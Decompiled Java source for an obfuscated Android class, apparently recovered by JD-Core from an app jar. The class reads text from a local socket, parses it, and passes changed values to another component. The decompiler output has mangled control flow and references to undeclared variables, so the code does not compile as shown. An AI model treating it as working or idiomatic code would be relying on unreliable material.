package com.vvt.al;

import android.net.LocalSocket;
import com.vvt.al.d.a;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;

class e
  implements Runnable
{
  private final DataInputStream b;
  private LocalSocket c;
  private a d;
  
  public e(d paramd, InputStream paramInputStream, LocalSocket paramLocalSocket)
  {
    this.c = paramLocalSocket;
    DataInputStream localDataInputStream = new java/io/DataInputStream;
    localDataInputStream.<init>(paramInputStream);
    this.b = localDataInputStream;
  }
  
  public void run()
  {
    try
    {
      InputStreamReader localInputStreamReader = new java/io/InputStreamReader;
      Object localObject3 = this.b;
      localInputStreamReader.<init>((InputStream)localObject3);
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      for (;;)
      {
        int i = localInputStreamReader.read();
        int j = -1;
        if (i == j) {
          break;
        }
        i = (char)i;
        ((StringBuilder)localObject3).append(i);
      }
      try
      {
        boolean bool2;
        Object localObject1;
        Object localObject4;
        String str;
        boolean bool1;
        localObject3 = this.c;
        ((LocalSocket)localObject3).close();
      }
      catch (IOException localIOException3)
      {
        for (;;) {}
      }
    }
    catch (IOException localIOException1)
    {
      bool2 = d.h();
      if (bool2) {}
      localObject1 = this.c;
      if (localObject1 != null) {}
      for (;;)
      {
        try
        {
          localObject1 = this.c;
          ((LocalSocket)localObject1).close();
          return;
        }
        catch (IOException localIOException2)
        {
          continue;
        }
        localObject3 = ((StringBuilder)localObject3).toString();
        bool2 = d.g();
        if (bool2) {}
        bool2 = false;
        localObject1 = null;
        localObject3 = b.c((String)localObject3);
        localObject4 = this.d;
        if ((localObject4 != null) && (localObject3 != null))
        {
          localObject4 = this.d;
          localObject4 = ((a)localObject4).a;
          str = ((a)localObject3).a;
          bool1 = ((String)localObject4).equalsIgnoreCase(str);
          if (bool1) {
            bool2 = true;
          }
        }
        this.d = ((a)localObject3);
        if (!bool2)
        {
          localObject1 = this.a;
          d.a((d)localObject1, (a)localObject3);
        }
        localObject1 = this.c;
        if (localObject1 != null)
        {
          localObject1 = this.c;
          ((LocalSocket)localObject1).close();
        }
      }
    }
    finally
    {
      localObject3 = this.c;
      if (localObject3 == null) {}
    }
    throw ((Throwable)localObject2);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */